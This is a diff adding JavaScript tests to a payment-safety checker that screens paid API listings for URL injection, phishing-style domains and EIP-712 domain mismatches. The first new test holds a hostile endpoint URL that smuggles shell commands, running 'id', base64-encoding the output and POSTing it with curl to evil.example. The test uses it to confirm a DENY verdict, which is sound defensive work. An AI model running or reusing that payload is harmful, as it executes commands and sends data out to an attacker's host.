@@ -99,6 +99,45 @@ test('check-payment: amount above the agent cap is DENY', async () => {
   assert.ok(r.reasons.includes('amount_above_user_cap'));
 });
 
+test('check-payment: listing endpoint with a shell payload is DENY endpoint_url_injection', async () => {
+  // Shape of a real OKX.AI listing seen in the trust scan (host replaced).
+  const evil = 'https://evil.example/api/market-insight;id|{base64,-w0}|{curl,-fsS,-m,8,-X,POST,https://evil.example/rce}';
+  const r = await checkPayment({ paymentRequired: REAL, requestUrl: evil, expected: Object.assign({}, LISTING, { endpoint: evil }) }, deps());
+  assert.equal(r.verdict, 'DENY');
+  assert.ok(r.reasons.includes('endpoint_url_injection'), JSON.stringify(r.reasons));
+  assert.ok(r.recommendations.some((x) => x.code === 'endpoint_url_injection'));
+});
+
+test('check-payment: URL templates, matrix params and encoded query values are not shell syntax', async () => {
+  for (const url of ['https://lno-radar-api.vercel.app/paid/{symbol}', 'https://lno-radar-api.vercel.app/paid/snapshot;v=2', 'https://lno-radar-api.vercel.app/paid/snapshot?ids=BTC%7CETH&q=a%20b%3Bc']) {
+    const r = await checkPayment({ paymentRequired: REAL, requestUrl: url, expected: LISTING }, deps());
+    assert.ok(!r.reasons.includes('endpoint_url_injection'), url + ' ' + JSON.stringify(r.reasons));
+  }
+});
+
+test('check-payment: brand-word host is WARN when the listing names it, DENY when nothing vouches for it', async () => {
+  const url = 'https://okx-seo-ai.vercel.app/v1/seo-audit';
+  const listed = await checkPayment({ paymentRequired: REAL, requestUrl: url, expected: Object.assign({}, LISTING, { endpoint: url }) }, deps());
+  assert.equal(listed.verdict, 'WARN', JSON.stringify(listed.reasons));
+  assert.ok(listed.reasons.includes('endpoint_domain_suspicious'));
+  const bare = await checkPayment({ paymentRequired: REAL, requestUrl: url }, deps());
+  assert.equal(bare.verdict, 'DENY');
+  assert.ok(bare.reasons.includes('endpoint_phishing_pattern'));
+  assert.ok(!bare.reasons.includes('injection_pattern'));
+});
+
+test('check-payment: wrong EIP-712 domain in extra is WARN with the canonical domain as evidence', async () => {
+  const wrong = clone(REAL);
+  wrong.accepts[0].extra = { name: 'USDT', version: '1' };
+  const r = await checkPayment({ paymentRequired: wrong, requestUrl: REQUEST_URL, expected: LISTING }, deps());
+  assert.equal(r.verdict, 'WARN');
+  const f = r.details.findings.find((x) => x.code === 'eip712_domain_mismatch');
+  assert.deepEqual(f.declared, { name: 'USDT', version: '1' });
+  assert.equal(f.canonical.name, 'USD₮0');
+  assert.equal(f.canonical.version, '1');
+  assert.match(f.canonical.domainSeparator, /^0xd591d9ba/);
+});
+
 async function signEip3009(wallet, { to, value, validAfter, validBefore }) {
   const nonce = '0x' + '11'.repeat(32);
   const domain = { name: 'USD₮0', version: '1', chainId: 196, verifyingContract: USDT0 };
